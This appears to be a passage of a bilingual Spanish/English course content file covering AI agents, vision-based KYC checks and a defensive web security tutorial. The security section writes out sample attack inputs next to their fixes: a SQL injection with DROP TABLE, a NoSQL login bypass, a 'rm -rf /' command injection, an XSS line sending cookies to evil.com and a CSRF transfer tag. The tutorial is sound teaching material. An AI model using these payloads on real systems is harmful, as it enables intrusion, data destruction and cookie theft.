## Agente básico con OpenAI

\`\`\`python
tools = [
    {
        "type": "function",
        "function": {
            "name": "search",
            "description": "Search the web",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {"type": "string"}
                }
            }
        }
    }
]

# Loop del agente
while True:
    response = client.chat.completions.create(
        model="gpt-4o",
        messages=messages,
        tools=tools
    )

    if response.choices[0].finish_reason == "tool_calls":
        # Ejecutar herramienta
        tool_call = response.choices[0].message.tool_calls[0]
        result = execute_tool(tool_call)
        messages.append({"role": "tool", "content": result})
    else:
        # Respuesta final
        break
\`\`\`

---

## Frameworks de agentes

| Framework | Enfoque |
|-----------|---------|
| **LangChain** | Chains y agents |
| **LangGraph** | Grafos de estado |
| **CrewAI** | Multi-agente |
| **AutoGen** | Conversación |
| **Claude Code** | Coding agent |

---

## 🏦 Caso Real: Agente para Conciliación Bancaria

Los agentes brillan en tareas financieras que requieren múltiples pasos y decisiones.

### Ejemplo: Agente de Conciliación

\`\`\`python
tools = [
    {"name": "fetch_bank_transactions", "description": "Obtener transacciones del banco"},
    {"name": "fetch_internal_records", "description": "Obtener registros internos"},
    {"name": "compare_records", "description": "Comparar y encontrar diferencias"},
    {"name": "generate_report", "description": "Crear reporte de conciliación"},
    {"name": "flag_discrepancy", "description": "Marcar discrepancia para revisión"},
]

# El agente decide qué hacer
system_prompt = """
Eres un agente de conciliación bancaria. Tu trabajo:
1. Obtener transacciones del banco (últimas 24h)
2. Obtener registros internos del mismo período
3. Comparar y encontrar discrepancias
4. Si hay diferencias > $100, marcar para revisión humana
5. Generar reporte final

Sé meticuloso. Un error aquí cuesta dinero real.
"""
\`\`\`

### Flujo del Agente

\`\`\`
Tarea: "Concilia las transacciones de ayer"
    ↓
Thought: Primero obtengo las transacciones del banco
Action: fetch_bank_transactions("2024-01-15")
Observation: 847 transacciones, total $1,234,567
    ↓
Thought: Ahora los registros internos
Action: fetch_internal_records("2024-01-15")
Observation: 845 transacciones, total $1,234,123
    ↓
Thought: Hay diferencia. Comparo en detalle
Action: compare_records(bank, internal)
Observation: 2 transacciones faltantes, diferencia $444
    ↓
Thought: Diferencia > $100, marco para revisión
Action: flag_discrepancy({amount: 444, txns: [...]})
    ↓
Action: generate_report() → ✅ Reporte enviado
\`\`\`

### Otros casos de uso en Fintech

| Caso | Herramientas | Valor |
|------|--------------|-------|
| **Análisis de riesgo** | APIs de credit bureau, calculadoras | Decisión de crédito automatizada |
| **Detección de fraude** | Bases de datos, reglas, ML | Bloqueo en tiempo real |
| **Onboarding KYC** | OCR, verificación, bases PEP | Proceso de horas → minutos |
| **Soporte al cliente** | CRM, knowledge base | Resolución sin humanos |

> 💡 Los agentes son ideales cuando la tarea tiene **múltiples pasos** y requiere **decisiones intermedias**.

---

## Practica

→ [Agente IA Autónomo](/es/cooking/ai-agent)
    `,
    contentEn: `
## Autonomous AI Agents

An agent = LLM + **tools** + **reasoning loop** to complete complex tasks.

---

## Agent vs Chatbot

| Chatbot | Agent |
|---------|-------|
| One response | Multiple steps |
| No tools | Uses tools |
| Reactive | Proactive |
| You control | It decides |

---

## Agent architecture

\`\`\`
              ┌─────────────────────────────────┐
              │            AGENT                │
              │  ┌─────────────────────────┐    │
              │  │       Reasoning         │    │
   Task  ───→ │  │  (ReAct, CoT, ToT)      │ ───→ Result
              │  └───────────┬─────────────┘    │
              │              ↓                  │
              │  ┌─────────────────────────┐    │
              │  │        Tools            │    │
              │  │  [Web] [Code] [Files]   │    │
              │  └─────────────────────────┘    │
              └─────────────────────────────────┘
\`\`\`

---

## ReAct pattern

\`\`\`
Thought: I need to search Madrid's weather
Action: search_weather("Madrid")
Observation: 22°C, sunny
Thought: I have the info now
Action: respond("The weather in Madrid is 22°C...")
\`\`\`

---

## Common tools

| Tool | Use |
|------|-----|
| **web_search** | Search information |
| **read_file** | Read documents |
| **write_file** | Create files |
| **run_code** | Execute Python |
| **ask_user** | Request clarification |

---

## Basic agent with OpenAI

\`\`\`python
tools = [
    {
        "type": "function",
        "function": {
            "name": "search",
            "description": "Search the web",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {"type": "string"}
                }
            }
        }
    }
]

# Agent loop
while True:
    response = client.chat.completions.create(
        model="gpt-4o",
        messages=messages,
        tools=tools
    )

    if response.choices[0].finish_reason == "tool_calls":
        # Execute tool
        tool_call = response.choices[0].message.tool_calls[0]
        result = execute_tool(tool_call)
        messages.append({"role": "tool", "content": result})
    else:
        # Final response
        break
\`\`\`

---

## Agent frameworks

| Framework | Focus |
|-----------|-------|
| **LangChain** | Chains and agents |
| **LangGraph** | State graphs |
| **CrewAI** | Multi-agent |
| **AutoGen** | Conversation |
| **Claude Code** | Coding agent |

---

## 🏦 Real Case: Bank Reconciliation Agent

Agents excel at financial tasks requiring multiple steps and decisions.

### Example: Reconciliation Agent

\`\`\`python
tools = [
    {"name": "fetch_bank_transactions", "description": "Get transactions from bank"},
    {"name": "fetch_internal_records", "description": "Get internal records"},
    {"name": "compare_records", "description": "Compare and find differences"},
    {"name": "generate_report", "description": "Create reconciliation report"},
    {"name": "flag_discrepancy", "description": "Flag discrepancy for review"},
]

# The agent decides what to do
system_prompt = """
You are a bank reconciliation agent. Your job:
1. Get bank transactions (last 24h)
2. Get internal records for the same period
3. Compare and find discrepancies
4. If differences > $100, flag for human review
5. Generate final report

Be meticulous. An error here costs real money.
"""
\`\`\`

### Agent Flow

\`\`\`
Task: "Reconcile yesterday's transactions"
    ↓
Thought: First I get bank transactions
Action: fetch_bank_transactions("2024-01-15")
Observation: 847 transactions, total $1,234,567
    ↓
Thought: Now internal records
Action: fetch_internal_records("2024-01-15")
Observation: 845 transactions, total $1,234,123
    ↓
Thought: There's a difference. Compare in detail
Action: compare_records(bank, internal)
Observation: 2 missing transactions, difference $444
    ↓
Thought: Difference > $100, flag for review
Action: flag_discrepancy({amount: 444, txns: [...]})
    ↓
Action: generate_report() → ✅ Report sent
\`\`\`

### Other Fintech Use Cases

| Case | Tools | Value |
|------|-------|-------|
| **Risk analysis** | Credit bureau APIs, calculators | Automated credit decision |
| **Fraud detection** | Databases, rules, ML | Real-time blocking |
| **KYC onboarding** | OCR, verification, PEP databases | Hours → minutes |
| **Customer support** | CRM, knowledge base | Resolution without humans |

> 💡 Agents are ideal when the task has **multiple steps** and requires **intermediate decisions**.

---

## Practice

→ [Autonomous AI Agent](/en/cooking/ai-agent)
    `,
  },

  'vision': {
    contentEs: `
## Vision & Multimodal AI

Los modelos multimodales procesan **múltiples tipos de entrada**: texto, imágenes, audio, video.

---

## Capacidades de visión

| Tarea | Descripción |
|-------|-------------|
| **OCR** | Extraer texto de imágenes |
| **Descripción** | Describir contenido visual |
| **Análisis** | Identificar objetos/personas |
| **Comparación** | Comparar imágenes |
| **Diagramas** | Entender gráficos/charts |

---

## Modelos multimodales

| Modelo | Proveedor | Entrada |
|--------|-----------|---------|
| **GPT-4V** | OpenAI | Texto + Imagen |
| **Claude 3** | Anthropic | Texto + Imagen |
| **Gemini Pro** | Google | Texto + Imagen + Audio |
| **LLaVA** | Open Source | Texto + Imagen |

---

## Enviar imagen a Claude

\`\`\`typescript
const response = await anthropic.messages.create({
  model: "claude-sonnet-4-20250514",
  max_tokens: 1024,
  messages: [{
    role: "user",
    content: [
      {
        type: "image",
        source: {
          type: "base64",
          media_type: "image/jpeg",
          data: base64Image
        }
      },
      {
        type: "text",
        text: "¿Qué hay en esta imagen?"
      }
    ]
  }]
});
\`\`\`

---

## Enviar imagen a OpenAI

\`\`\`python
response = client.chat.completions.create(
    model="gpt-4o",
    messages=[{
        "role": "user",
        "content": [
            {"type": "text", "text": "¿Qué hay en esta imagen?"},
            {
                "type": "image_url",
                "image_url": {
                    "url": f"data:image/jpeg;base64,{base64_image}"
                }
            }
        ]
    }]
)
\`\`\`

---

## Casos de uso reales

| Aplicación | Ejemplo |
|------------|---------|
| **Accesibilidad** | Describir imágenes para ciegos |
| **Documentos** | Extraer datos de facturas |
| **Retail** | Analizar productos en fotos |
| **Salud** | Análisis preliminar de rayos X |
| **Seguridad** | Detección de contenido |

---

## Modelos de clasificación de imágenes

Para tareas específicas, usa modelos especializados:

\`\`\`python
from transformers import pipeline

# Clasificación
classifier = pipeline("image-classification")
result = classifier("cat.jpg")
# → [{"label": "cat", "score": 0.99}]

# Detección de objetos
detector = pipeline("object-detection")
objects = detector("street.jpg")
# → [{"label": "car", "box": {...}}]
\`\`\`

---

## 🏦 Caso Fintech: Verificación KYC con Vision

Know Your Customer (KYC) requiere verificar documentos de identidad. Vision AI automatiza este proceso:

\`\`\`typescript
import Anthropic from '@anthropic-ai/sdk';

const anthropic = new Anthropic();

interface KYCResult {
  documentType: 'passport' | 'id_card' | 'drivers_license' | 'unknown';
  extractedData: {
    fullName?: string;
    documentNumber?: string;
    expiryDate?: string;
    nationality?: string;
  };
  validationChecks: {
    isExpired: boolean;
    formatValid: boolean;
    photoDetected: boolean;
  };
  confidence: number;
  requiresManualReview: boolean;
}

async function verifyKYCDocument(imageBase64: string): Promise<KYCResult> {
  const response = await anthropic.messages.create({
    model: "claude-sonnet-4-20250514",
    max_tokens: 1024,
    messages: [{
      role: "user",
      content: [
        {
          type: "image",
          source: { type: "base64", media_type: "image/jpeg", data: imageBase64 }
        },
        {
          type: "text",
          text: \`Analiza este documento de identidad para KYC. Extrae:
1. Tipo de documento (passport, id_card, drivers_license)
2. Nombre completo
3. Número de documento
4. Fecha de expiración
5. Nacionalidad

Verifica:
- ¿El documento está expirado?
- ¿El formato parece válido?
- ¿Se detecta foto del titular?

Responde SOLO en JSON con este formato:
{
  "documentType": "...",
  "extractedData": {...},
  "validationChecks": {...},
  "confidence": 0.0-1.0,
  "requiresManualReview": true/false
}

IMPORTANTE: Si hay CUALQUIER duda sobre la autenticidad, marca requiresManualReview: true\`
        }
      ]
    }]
  });

  // Parsear respuesta y validar
  const result = JSON.parse(response.content[0].text);

  // Regla de negocio: baja confianza = revisión manual
  if (result.confidence < 0.85) {
    result.requiresManualReview = true;
  }

  // Log para auditoría (sin datos sensibles)
  await auditLog({
    action: 'KYC_VERIFICATION',
    documentType: result.documentType,
    confidence: result.confidence,
    requiresManualReview: result.requiresManualReview,
    timestamp: new Date().toISOString()
  });

  return result;
}
\`\`\`

### Consideraciones de seguridad KYC

| Aspecto | Recomendación |
|---------|---------------|
| **Almacenamiento** | Encriptar imágenes en reposo (AES-256) |
| **Retención** | Eliminar después de verificación (30-90 días) |
| **Logs** | NO guardar datos extraídos en logs |
| **Fallback** | Siempre tener revisión humana disponible |
| **Regulación** | Cumplir con GDPR/LGPD para datos biométricos |

> 💡 Vision AI acelera KYC de días a minutos, pero siempre mantén un humano en el loop para casos de baja confianza.

---

## Practica

→ [Clasificador de Imágenes](/es/cooking/image-classifier)
→ [App Multimodal](/es/cooking/multimodal-app)
    `,
    contentEn: `
## Vision & Multimodal AI

Multimodal models process **multiple input types**: text, images, audio, video.

---

## Vision capabilities

| Task | Description |
|------|-------------|
| **OCR** | Extract text from images |
| **Description** | Describe visual content |
| **Analysis** | Identify objects/people |
| **Comparison** | Compare images |
| **Diagrams** | Understand charts/graphs |

---

## Multimodal models

| Model | Provider | Input |
|-------|----------|-------|
| **GPT-4V** | OpenAI | Text + Image |
| **Claude 3** | Anthropic | Text + Image |
| **Gemini Pro** | Google | Text + Image + Audio |
| **LLaVA** | Open Source | Text + Image |

---

## Send image to Claude

\`\`\`typescript
const response = await anthropic.messages.create({
  model: "claude-sonnet-4-20250514",
  max_tokens: 1024,
  messages: [{
    role: "user",
    content: [
      {
        type: "image",
        source: {
          type: "base64",
          media_type: "image/jpeg",
          data: base64Image
        }
      },
      {
        type: "text",
        text: "What's in this image?"
      }
    ]
  }]
});
\`\`\`

---

## Send image to OpenAI

\`\`\`python
response = client.chat.completions.create(
    model="gpt-4o",
    messages=[{
        "role": "user",
        "content": [
            {"type": "text", "text": "What's in this image?"},
            {
                "type": "image_url",
                "image_url": {
                    "url": f"data:image/jpeg;base64,{base64_image}"
                }
            }
        ]
    }]
)
\`\`\`

---

## Real use cases

| Application | Example |
|-------------|---------|
| **Accessibility** | Describe images for blind users |
| **Documents** | Extract data from invoices |
| **Retail** | Analyze products in photos |
| **Health** | Preliminary X-ray analysis |
| **Security** | Content detection |

---

## Image classification models

For specific tasks, use specialized models:

\`\`\`python
from transformers import pipeline

# Classification
classifier = pipeline("image-classification")
result = classifier("cat.jpg")
# → [{"label": "cat", "score": 0.99}]

# Object detection
detector = pipeline("object-detection")
objects = detector("street.jpg")
# → [{"label": "car", "box": {...}}]
\`\`\`

---

## 🏦 Fintech Case: KYC Verification with Vision

Know Your Customer (KYC) requires identity document verification. Vision AI automates this process:

\`\`\`typescript
import Anthropic from '@anthropic-ai/sdk';

const anthropic = new Anthropic();

interface KYCResult {
  documentType: 'passport' | 'id_card' | 'drivers_license' | 'unknown';
  extractedData: {
    fullName?: string;
    documentNumber?: string;
    expiryDate?: string;
    nationality?: string;
  };
  validationChecks: {
    isExpired: boolean;
    formatValid: boolean;
    photoDetected: boolean;
  };
  confidence: number;
  requiresManualReview: boolean;
}

async function verifyKYCDocument(imageBase64: string): Promise<KYCResult> {
  const response = await anthropic.messages.create({
    model: "claude-sonnet-4-20250514",
    max_tokens: 1024,
    messages: [{
      role: "user",
      content: [
        {
          type: "image",
          source: { type: "base64", media_type: "image/jpeg", data: imageBase64 }
        },
        {
          type: "text",
          text: \`Analyze this identity document for KYC. Extract:
1. Document type (passport, id_card, drivers_license)
2. Full name
3. Document number
4. Expiry date
5. Nationality

Verify:
- Is the document expired?
- Does the format appear valid?
- Is a photo of the holder detected?

Respond ONLY in JSON with this format:
{
  "documentType": "...",
  "extractedData": {...},
  "validationChecks": {...},
  "confidence": 0.0-1.0,
  "requiresManualReview": true/false
}

IMPORTANT: If there's ANY doubt about authenticity, set requiresManualReview: true\`
        }
      ]
    }]
  });

  // Parse response and validate
  const result = JSON.parse(response.content[0].text);

  // Business rule: low confidence = manual review
  if (result.confidence < 0.85) {
    result.requiresManualReview = true;
  }

  // Audit log (no sensitive data)
  await auditLog({
    action: 'KYC_VERIFICATION',
    documentType: result.documentType,
    confidence: result.confidence,
    requiresManualReview: result.requiresManualReview,
    timestamp: new Date().toISOString()
  });

  return result;
}
\`\`\`

### KYC Security Considerations

| Aspect | Recommendation |
|--------|----------------|
| **Storage** | Encrypt images at rest (AES-256) |
| **Retention** | Delete after verification (30-90 days) |
| **Logs** | DO NOT store extracted data in logs |
| **Fallback** | Always have human review available |
| **Regulation** | Comply with GDPR/CCPA for biometric data |

> 💡 Vision AI accelerates KYC from days to minutes, but always keep a human in the loop for low confidence cases.

---

## Practice

→ [Image Classifier](/en/cooking/image-classifier)
→ [Multimodal App](/en/cooking/multimodal-app)
    `,
  },

  'security': {
    contentEs: `
## La seguridad no es opcional

Imagina que construyes una casa hermosa pero dejas todas las puertas y ventanas abiertas. No importa que tan bonita sea, cualquiera puede entrar y llevarse todo. La seguridad en aplicaciones web funciona exactamente igual.

> **La diferencia entre un desarrollador junior y uno senior no es solo escribir codigo que funciona, sino codigo que no puede ser explotado.**

---

## OWASP Top 10: Las vulnerabilidades mas criticas

OWASP (Open Web Application Security Project) mantiene una lista de las 10 vulnerabilidades mas peligrosas. Conocerlas es el primer paso para proteger tu aplicacion.

| # | Vulnerabilidad | Analogia |
|---|----------------|----------|
| 1 | **Broken Access Control** | Dar llaves maestras a todos |
| 2 | **Cryptographic Failures** | Guardar contrasenas en post-its |
| 3 | **Injection** | Aceptar cualquier paquete sin revisar |
| 4 | **Insecure Design** | Casa sin cerraduras desde el plano |
| 5 | **Security Misconfiguration** | Dejar la puerta trasera abierta |
| 6 | **Vulnerable Components** | Usar materiales defectuosos |
| 7 | **Auth Failures** | Portero que deja pasar a todos |
| 8 | **Software/Data Integrity** | No verificar quien modifico algo |
| 9 | **Logging Failures** | No tener camaras de seguridad |
| 10 | **SSRF** | Dejar que extranos usen tu telefono |

---

## Ataques de Inyeccion

Los ataques de inyeccion ocurren cuando datos no confiables se envian a un interprete como parte de un comando o consulta.

### SQL Injection

**Analogia**: Es como si alguien te preguntara su nombre para registrarlo, y en vez de decir "Juan", dijera "Juan; BORRAR TODO EL REGISTRO".

\`\`\`javascript
// VULNERABLE - Nunca hagas esto
const query = \`SELECT * FROM users WHERE id = \${userId}\`;

// Atacante envia: userId = "1 OR 1=1; DROP TABLE users;--"
// Resultado: Se ejecuta codigo malicioso
\`\`\`

\`\`\`javascript
// SEGURO - Usa consultas parametrizadas
const query = 'SELECT * FROM users WHERE id = $1';
const result = await pool.query(query, [userId]);

// Con ORMs como Prisma (recomendado)
const user = await prisma.user.findUnique({
  where: { id: parseInt(userId) }
});
\`\`\`

### NoSQL Injection

\`\`\`javascript
// VULNERABLE
const user = await User.findOne({
  username: req.body.username,
  password: req.body.password
});

// Atacante envia: { "username": "admin", "password": { "$gt": "" } }
// Esto encuentra cualquier usuario con password mayor a string vacio!
\`\`\`

\`\`\`javascript
// SEGURO - Valida y sanitiza inputs
import { z } from 'zod';

const loginSchema = z.object({
  username: z.string().min(3).max(50),
  password: z.string().min(8)
});

const { username, password } = loginSchema.parse(req.body);
const user = await User.findOne({ username, password: hashPassword(password) });
\`\`\`

### Command Injection

\`\`\`javascript
// VULNERABLE
const { exec } = require('child_process');
exec(\`ping \${userInput}\`, callback);

// Atacante envia: "google.com; rm -rf /"
// Resultado: Borra todo el servidor!
\`\`\`

\`\`\`javascript
// SEGURO - Usa execFile con argumentos separados
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', sanitizedHost], callback);

// O mejor, usa librerias especificas
import ping from 'ping';
const result = await ping.promise.probe(sanitizedHost);
\`\`\`

---

## XSS (Cross-Site Scripting)

XSS permite a atacantes inyectar scripts maliciosos en paginas web vistas por otros usuarios.

**Analogia**: Es como si alguien pudiera pegar stickers falsos en tu tienda que enganan a tus clientes.

### Tipos de XSS

| Tipo | Descripcion | Ejemplo |
|------|-------------|---------|
| **Stored** | Script guardado en DB | Comentario con \`<script>\` |
| **Reflected** | Script en URL | Link malicioso por email |
| **DOM-based** | Manipulacion del DOM | \`document.write(location.hash)\` |

### Ejemplos vulnerables vs seguros

\`\`\`javascript
// VULNERABLE - React con dangerouslySetInnerHTML
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// Atacante guarda: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

\`\`\`javascript
// SEGURO - React escapa automaticamente
function Comment({ text }) {
  return <div>{text}</div>; // Los tags se muestran como texto
}

// Si necesitas HTML, usa DOMPurify
import DOMPurify from 'dompurify';

function Comment({ text }) {
  const clean = DOMPurify.sanitize(text);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
\`\`\`

\`\`\`javascript
// VULNERABLE - Template literals en HTML
app.get('/search', (req, res) => {
  res.send(\`<h1>Resultados para: \${req.query.q}</h1>\`);
});

// Atacante visita: /search?q=<script>alert('XSS')</script>
\`\`\`

\`\`\`javascript
// SEGURO - Escapa el output
import escapeHtml from 'escape-html';

app.get('/search', (req, res) => {
  res.send(\`<h1>Resultados para: \${escapeHtml(req.query.q)}</h1>\`);
});
\`\`\`

---

## CSRF (Cross-Site Request Forgery)

CSRF engana a usuarios autenticados para ejecutar acciones no deseadas.

**Analogia**: Alguien falsifica tu firma en un documento mientras estas distraido.

\`\`\`html
<!-- Sitio malicioso evil.com -->
<img src="https://tubank.com/transfer?to=hacker&amount=10000" />
<!-- El navegador envia las cookies automaticamente! -->
\`\`\`

### Proteccion con tokens CSRF

\`\`\`javascript
// Backend - Generar token
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // El middleware valida el token automaticamente
  processTransfer(req.body);
});
\`\`\`

\`\`\`html
<!-- Frontend - Incluir token en formularios -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
  <input type="text" name="amount" />
  <button type="submit">Transferir</button>
</form>
\`\`\`

### SameSite Cookies (Defensa moderna)

\`\`\`javascript
// Configurar cookies con SameSite
res.cookie('session', sessionId, {
  httpOnly: true,      // No accesible desde JavaScript
  secure: true,        // Solo HTTPS
  sameSite: 'strict',  // No se envia en requests cross-site
  maxAge: 3600000      // 1 hora
});
\`\`\`

---

## Autenticacion y Sesiones Seguras

### Almacenamiento de contrasenas

\`\`\`javascript
// NUNCA - Texto plano
const user = { password: 'miPassword123' }; // NUNCA!

// NUNCA - Hashing debil
const hash = crypto.createHash('md5').update(password).digest('hex');

// SIEMPRE - bcrypt con salt
import bcrypt from 'bcrypt';

// Al registrar
const saltRounds = 12;
const hashedPassword = await bcrypt.hash(password, saltRounds);

// Al login
const isValid = await bcrypt.compare(inputPassword, hashedPassword);
\`\`\`

### JWT seguro

\`\`\`javascript
import jwt from 'jsonwebtoken';

// Generar token
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  {
    expiresIn: '1h',
    algorithm: 'HS256'
  }
);

// Verificar token
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
} catch (error) {
  // Token invalido o expirado
}
\`\`\`

### Sesiones seguras con Redis

\`\`\`javascript
import session from 'express-session';
import RedisStore from 'connect-redis';
import { createClient } from 'redis';

const redisClient = createClient();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    maxAge: 1000 * 60 * 60 * 24 // 1 dia
  }
}));
\`\`\`

---

## Exposicion de Datos Sensibles

### Que NUNCA debe estar en tu codigo

\`\`\`javascript
// NUNCA en el codigo
const API_KEY = 'sk-1234567890abcdef'; // NUNCA!
const DB_PASSWORD = 'superSecretPassword'; // NUNCA!

// SIEMPRE en variables de entorno
const API_KEY = process.env.API_KEY;
const DB_PASSWORD = process.env.DB_PASSWORD;
\`\`\`

### .env y .gitignore

\`\`\`bash
# .env (NUNCA en Git)
DATABASE_URL=postgresql://user:pass@localhost:5432/db
JWT_SECRET=tu-secreto-muy-largo-y-aleatorio
API_KEY=sk-produccion-key
\`\`\`

\`\`\`bash
# .gitignore
.env
.env.local
.env.*.local
*.pem
*.key
\`\`\`

### Encriptacion de datos sensibles

\`\`\`javascript
import crypto from 'crypto';

const algorithm = 'aes-256-gcm';
const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return {
    iv: iv.toString('hex'),
    encrypted,
    authTag: authTag.toString('hex')
  };
}

function decrypt({ iv, encrypted, authTag }) {
  const decipher = crypto.createDecipheriv(
    algorithm,
    key,
    Buffer.from(iv, 'hex')
  );
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));

  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
\`\`\`

---

## Security Headers

Los headers HTTP son tu primera linea de defensa.

### Configuracion con Helmet (Express)

\`\`\`javascript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.tudominio.com"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
\`\`\`

### Headers en Next.js

\`\`\`javascript
// next.config.js
const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload'
  },
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin'
  },
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline';"
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders
      }
    ];
  }
};
\`\`\`

### Principales headers explicados

| Header | Funcion |
|--------|---------|
| **CSP** | Controla que recursos puede cargar la pagina |
| **HSTS** | Fuerza HTTPS en el navegador |
| **X-Frame-Options** | Previene clickjacking |
| **X-Content-Type-Options** | Previene MIME sniffing |
| **CORS** | Controla requests cross-origin |

---

## Validacion y Sanitizacion

### Zod para validacion de schemas

\`\`\`javascript
import { z } from 'zod';

// Definir schema
const userSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).regex(/[A-Z]/).regex(/[0-9]/),
  age: z.number().min(18).max(120).optional(),
  role: z.enum(['user', 'admin']).default('user')
});

// Validar en endpoint
app.post('/register', async (req, res) => {
  try {
    const validData = userSchema.parse(req.body);
    // Datos seguros para usar
    await createUser(validData);
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({ errors: error.errors });
    }
  }
});
\`\`\`

### Sanitizacion de HTML

\`\`\`javascript
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Configuracion estricta
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false
});
\`\`\`

---

## Seguridad de Dependencias

### npm audit

\`\`\`bash
# Revisar vulnerabilidades
npm audit

# Arreglar automaticamente
npm audit fix

# Ver detalle de vulnerabilidades criticas
npm audit --audit-level=critical
\`\`\`

### Snyk (Recomendado)

\`\`\`bash
# Instalar
npm install -g snyk

# Autenticar
snyk auth

# Escanear proyecto
snyk test

# Monitorear continuamente
snyk monitor
\`\`\`

### Dependabot en GitHub

\`\`\`yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
\`\`\`

---

## Herramientas de Testing de Seguridad

| Herramienta | Tipo | Uso |
|-------------|------|-----|
| **OWASP ZAP** | DAST | Escaneo automatico de web |
| **Burp Suite** | Proxy | Testing manual avanzado |
| **SonarQube** | SAST | Analisis estatico de codigo |
| **Snyk** | SCA | Dependencias vulnerables |
| **npm audit** | SCA | Dependencias npm |
| **ESLint Security** | SAST | Reglas de seguridad JS |

### ESLint con reglas de seguridad

\`\`\`javascript
// .eslintrc.js
module.exports = {
  plugins: ['security'],
  extends: ['plugin:security/recommended'],
  rules: {
    'security/detect-object-injection': 'error',
    'security/detect-non-literal-regexp': 'error',
    'security/detect-unsafe-regex': 'error',
    'security/detect-buffer-noassert': 'error',
    'security/detect-eval-with-expression': 'error',
    'security/detect-no-csrf-before-method-override': 'error'
  }
};
\`\`\`

---

## Checklist de seguridad

- [ ] Validar y sanitizar TODOS los inputs
- [ ] Usar consultas parametrizadas (no concatenar SQL)
- [ ] Hashear contrasenas con bcrypt (saltRounds >= 12)
- [ ] Implementar CSRF tokens o SameSite cookies
- [ ] Configurar security headers (CSP, HSTS, etc.)
- [ ] Mantener dependencias actualizadas
- [ ] No exponer secretos en codigo o logs
- [ ] Usar HTTPS en produccion
- [ ] Implementar rate limiting
- [ ] Logging de eventos de seguridad

---

## Practica

-> [Auditoria de Seguridad](/es/cooking/security-audit) - Analiza y corrige vulnerabilidades en una app

---

## Enlaces utiles

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Snyk Learn](https://learn.snyk.io/)
- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
    `,
    contentEn: `
## Security is not optional

Imagine building a beautiful house but leaving all doors and windows open. No matter how pretty it is, anyone can enter and take everything. Web application security works exactly the same way.

> **The difference between a junior and senior developer is not just writing code that works, but code that cannot be exploited.**

---

## OWASP Top 10: The most critical vulnerabilities

OWASP (Open Web Application Security Project) maintains a list of the 10 most dangerous vulnerabilities. Knowing them is the first step to protecting your application.

| # | Vulnerability | Analogy |
|---|---------------|---------|
| 1 | **Broken Access Control** | Giving master keys to everyone |
| 2 | **Cryptographic Failures** | Storing passwords on post-its |
| 3 | **Injection** | Accepting any package without checking |
| 4 | **Insecure Design** | House without locks from the blueprint |
| 5 | **Security Misconfiguration** | Leaving the back door open |
| 6 | **Vulnerable Components** | Using defective materials |
| 7 | **Auth Failures** | Doorman who lets everyone in |
| 8 | **Software/Data Integrity** | Not verifying who modified something |
| 9 | **Logging Failures** | Not having security cameras |
| 10 | **SSRF** | Letting strangers use your phone |

---

## Injection Attacks

Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query.

### SQL Injection

**Analogy**: It is like if someone asked for their name to register, and instead of saying "John", they said "John; DELETE ALL RECORDS".

\`\`\`javascript
// VULNERABLE - Never do this
const query = \`SELECT * FROM users WHERE id = \${userId}\`;

// Attacker sends: userId = "1 OR 1=1; DROP TABLE users;--"
// Result: Malicious code executes
\`\`\`

\`\`\`javascript
// SECURE - Use parameterized queries
const query = 'SELECT * FROM users WHERE id = $1';
const result = await pool.query(query, [userId]);

// With ORMs like Prisma (recommended)
const user = await prisma.user.findUnique({
  where: { id: parseInt(userId) }
});
\`\`\`

### NoSQL Injection

\`\`\`javascript
// VULNERABLE
const user = await User.findOne({
  username: req.body.username,
  password: req.body.password
});

